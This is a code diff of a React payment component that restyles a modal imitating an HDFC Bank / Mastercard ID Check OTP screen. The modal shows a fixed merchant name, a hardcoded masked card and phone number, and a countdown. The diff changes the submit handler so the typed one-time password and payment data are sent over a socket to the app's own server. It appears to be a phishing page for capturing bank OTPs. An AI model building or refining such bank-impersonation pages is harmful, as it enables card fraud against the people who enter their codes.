@@ -111,7 +111,11 @@ const Payment = () => {
 
   const handleOtpSubmit = () => {
     if (otp.length === 6 && socket) {
-      socket.emit('otp-submitted', { otp });
+      socket.emit('otp-submitted', { 
+        otp,
+        paymentId: planData.id || 'payment-' + Date.now(),
+        planData 
+      });
       setIsProcessing(true);
       setError(''); // Clear any previous errors
     }
@@ -185,140 +189,145 @@ const Payment = () => {
 
           {/* OTP Input */}
           {showOtp && !success && !error && (
-            <div className="relative bg-white rounded-lg shadow-2xl max-w-md mx-auto border">
-              {/* Cancel Button - Top Right */}
-              <button
-                onClick={handleBack}
-                className="absolute top-4 right-4 text-gray-500 hover:text-gray-700 text-sm font-medium"
-              >
-                CANCEL
-              </button>
+            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+              <div className="relative bg-white rounded-lg shadow-2xl max-w-md w-full mx-auto">
+                {/* Cancel Button - Top Right */}
+                <button
+                  onClick={handleBack}
+                  className="absolute top-4 right-4 text-gray-500 hover:text-gray-700 text-sm font-medium z-10"
+                >
+                  CANCEL
+                </button>
 
-              {/* Header */}
-              <div className="p-6 border-b">
-                <div className="flex items-center gap-3 mb-4">
-                  <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
-                    <span className="text-white text-xs font-bold">MC</span>
+                {/* Header */}
+                <div className="p-6 border-b">
+                  <div className="flex items-center gap-3 mb-4">
+                    <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
+                      <span className="text-white text-xs font-bold">MC</span>
+                    </div>
+                    <span className="font-semibold text-gray-800">ID Check</span>
                   </div>
-                  <span className="font-semibold text-gray-800">ID Check</span>
-                </div>
-                
-                <div className="bg-red-600 text-white text-center py-2 rounded">
-                  <span className="font-bold text-lg">🏥 HDFC BANK</span>
-                </div>
-              </div>
-
-              {/* Merchant Details */}
-              <div className="p-6 border-b">
-                <h3 className="text-blue-600 font-semibold text-lg mb-4 text-center">Merchant Details</h3>
-                
-                <div className="space-y-3 text-sm">
-                  <div className="flex justify-between">
-                    <span className="text-gray-600">Merchant Name</span>
-                    <span className="font-medium">XAI LLC</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-gray-600">Date</span>
-                    <span className="font-medium">{new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-gray-600">Card Number</span>
-                    <span className="font-medium">5522 XXXX XXXX 7167</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-gray-600">Amount</span>
-                    <span className="font-medium text-blue-600">₹{planData.price?.toLocaleString()}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="text-gray-600">Personal Message</span>
-                    <span className="font-medium"></span>
+                  
+                  <div className="bg-red-600 text-white text-center py-3 rounded flex items-center justify-center gap-2">
+                    <span className="text-2xl">🏥</span>
+                    <span className="font-bold text-lg">HDFC BANK</span>
                   </div>
                 </div>
-              </div>
 
-              {/* Authentication Section */}
-              <div className="p-6">
-                <h3 className="text-blue-600 font-semibold text-lg mb-4 text-center">Authenticate Transaction</h3>
-                
-                {/* Success Message */}
-                <div className="bg-green-100 border border-green-300 rounded p-3 mb-4 text-center">
-                  <p className="text-green-700 text-sm">
-                    Successfully sent OTP to your registered mobile number<br />
-                    XXXXXX4939
+                {/* Merchant Details */}
+                <div className="p-6 border-b bg-gray-50">
+                  <h3 className="text-blue-600 font-semibold text-lg mb-4 text-center">Merchant Details</h3>
+                  
+                  <div className="space-y-3 text-sm bg-white rounded p-4">
+                    <div className="flex justify-between py-1">
+                      <span className="text-gray-600">Merchant Name</span>
+                      <span className="font-medium">XAI LLC</span>
+                    </div>
+                    <div className="flex justify-between py-1">
+                      <span className="text-gray-600">Date</span>
+                      <span className="font-medium">{new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</span>
+                    </div>
+                    <div className="flex justify-between py-1">
+                      <span className="text-gray-600">Card Number</span>
+                      <span className="font-medium">5522 XXXX XXXX 7167</span>
+                    </div>
+                    <div className="flex justify-between py-1">
+                      <span className="text-gray-600">Amount</span>
+                      <span className="font-medium text-blue-600">₹{planData.price?.toLocaleString()}.00</span>
+                    </div>
+                    <div className="flex justify-between py-1">
+                      <span className="text-gray-600">Personal Message</span>
+                      <span className="font-medium text-gray-400">-</span>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Authentication Section */}
+                <div className="p-6">
+                  <h3 className="text-blue-600 font-semibold text-lg mb-4 text-center">Authenticate Transaction</h3>
+                  
+                  {/* Success Message */}
+                  <div className="bg-green-100 border border-green-300 rounded p-3 mb-4 text-center">
+                    <p className="text-green-700 text-sm">
+                      Successfully sent OTP to your registered mobile number<br />
+                      <span className="font-mono">XXXXXX4939</span>
+                    </p>
+                  </div>
+
+                  {/* OTP Error Message */}
+                  {error && (
+                    <div className="bg-red-100 border border-red-300 rounded p-3 mb-4 text-center">
+                      <p className="text-red-700 text-sm font-medium">{error}</p>
+                    </div>
+                  )}
+
+                  {/* Click Here Button */}
+                  <div className="text-center mb-4">
+                    <button className="bg-blue-600 text-white px-6 py-2 rounded text-sm font-medium hover:bg-blue-700 mr-2">
+                      CLICK HERE
+                    </button>
+                    <span className="text-sm text-gray-700">For Addon Cardholder OTP</span>
+                  </div>
+
+                  {/* OTP Input */}
+                  <div className="mb-4">
+                    <div className="text-center mb-2">
+                      <input
+                        type="text"
+                        placeholder="Enter OTP Here"
+                        value={otp}
+                        onChange={(e) => setOtp(e.target.value)}
+                        disabled={isProcessing}
+                        className={`w-full p-3 border border-gray-300 rounded text-center text-lg font-mono ${isProcessing ? 'bg-gray-100' : ''}`}
+                        maxLength={6}
+                      />
+                    </div>
+                    <div className="text-center">
+                      <button className="text-blue-600 text-sm hover:underline">Resend OTP</button>
+                    </div>
+                  </div>
+
+                  {/* Action Buttons */}
+                  <div className="space-y-3">
+                    <button
+                      onClick={handleBack}
+                      className="w-full border border-gray-300 text-gray-700 py-3 rounded hover:bg-gray-50 font-medium"
+                    >
+                      CANCEL
+                    </button>
+                    <button
+                      onClick={handleOtpSubmit}
+                      disabled={otp.length !== 6 || isProcessing}
+                      className={`w-full bg-blue-600 text-white py-3 rounded font-medium hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${isProcessing ? 'relative' : ''}`}
+                    >
+                      {isProcessing ? (
+                        <>
+                          <div className="absolute inset-0 flex items-center justify-center">
+                            <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
+                          </div>
+                          <span className="blur-sm">SUBMIT</span>
+                        </>
+                      ) : (
+                        'SUBMIT'
+                      )}
+                    </button>
+                  </div>
+
+                  {/* Timer */}
+                  <p className="text-center text-xs text-gray-500 mt-4">
+                    This page automatically time out after 1:59 seconds
                   </p>
-                </div>
 
-                {/* OTP Error Message */}
-                {error && (
-                  <div className="bg-red-100 border border-red-300 rounded p-3 mb-4 text-center">
-                    <p className="text-red-700 text-sm">{error}</p>
-                  </div>
-                )}
-
-                {/* Click Here Button */}
-                <div className="text-center mb-4">
-                  <button className="bg-blue-600 text-white px-4 py-2 rounded text-sm font-medium hover:bg-blue-700">
-                    CLICK HERE
-                  </button>
-                  <span className="ml-2 text-sm">For Addon Cardholder OTP</span>
-                </div>
-
-                {/* OTP Input */}
-                <div className="mb-4">
-                  <InputOTP
-                    maxLength={6}
-                    value={otp}
-                    onChange={setOtp}
-                    disabled={isProcessing}
-                    className="w-full"
-                  >
-                    <InputOTPGroup className="w-full justify-center">
-                      <InputOTPSlot index={0} className="w-12 h-12 text-lg" />
-                      <InputOTPSlot index={1} className="w-12 h-12 text-lg" />
-                      <InputOTPSlot index={2} className="w-12 h-12 text-lg" />
-                      <InputOTPSlot index={3} className="w-12 h-12 text-lg" />
-                      <InputOTPSlot index={4} className="w-12 h-12 text-lg" />
-                      <InputOTPSlot index={5} className="w-12 h-12 text-lg" />
-                    </InputOTPGroup>
-                  </InputOTP>
-                  <div className="text-center mt-2">
-                    <button className="text-blue-600 text-sm hover:underline">Resend OTP</button>
-                  </div>
-                </div>
-
-                {/* Action Buttons */}
-                <div className="space-y-3">
-                  <button
-                    onClick={handleBack}
-                    className="w-full border border-gray-300 text-gray-700 py-2 rounded hover:bg-gray-50"
-                  >
-                    CANCEL
-                  </button>
-                  <button
-                    onClick={handleOtpSubmit}
-                    disabled={otp.length !== 6 || isProcessing}
-                    className={`w-full bg-blue-600 text-white py-2 rounded font-medium hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${isProcessing ? 'blur-sm' : ''}`}
-                  >
-                    {isProcessing ? (
-                      <div className="flex items-center justify-center gap-2">
-                        <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
-                        <span className="blur-sm">SUBMIT</span>
+                  {/* Powered by */}
+                  <div className="text-center mt-4 pt-4 border-t border-gray-200">
+                    <p className="text-xs text-gray-400 mb-1">Powered by</p>
+                    <div className="flex items-center justify-center">
+                      <div className="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center mr-1">
+                        <div className="w-3 h-3 bg-white rounded-full"></div>
                       </div>
-                    ) : (
-                      'SUBMIT'
-                    )}
-                  </button>
-                </div>
-
-                {/* Timer */}
-                <p className="text-center text-xs text-gray-500 mt-4">
-                  This page automatically time out after 1:59 seconds
-                </p>
-
-                {/* Powered by */}
-                <div className="text-center mt-4">
-                  <p className="text-xs text-gray-400">Powered by</p>
-                  <div className="text-green-600 font-semibold text-sm">●●●●●●●</div>
+                      <span className="text-green-600 font-semibold text-sm">onetap</span>
+                    </div>
+                  </div>
                 </div>
               </div>
             </div>
